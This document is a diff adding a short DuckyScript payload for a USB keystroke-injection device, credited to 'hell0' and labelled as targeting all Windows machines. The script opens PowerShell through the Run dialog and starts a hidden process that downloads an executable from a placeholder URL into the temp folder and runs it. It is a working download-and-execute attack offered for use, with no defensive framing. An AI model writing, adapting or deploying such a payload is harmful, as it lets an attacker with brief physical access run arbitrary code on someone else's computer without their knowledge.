@@ -1,0 +1,17 @@
+REM Author: hell0
+REM Description: Downloads an .exe file from the URL and runs it on the target pc.
+REM Version: 1.0
+REM Category: Execution
+REM Target: All Windows
+DELAY 500
+GUI d
+DELAY 500
+GUI r
+DELAY 500
+STRING powershell.exe
+ENTER
+DELAY 2000
+STRING Start-Process -FilePath "powershell" -ArgumentList "/c cd $Env:temp;Invoke-WebRequest -Uri 'https://yoursite.com/your_executable.exe' -OutFile 'your_executable.exe'; Start-Process -FilePath '.\your_executable.exe'; exit" -WindowStyle Hidden; exit
+ENTER
+DELAY 500
+GUI d
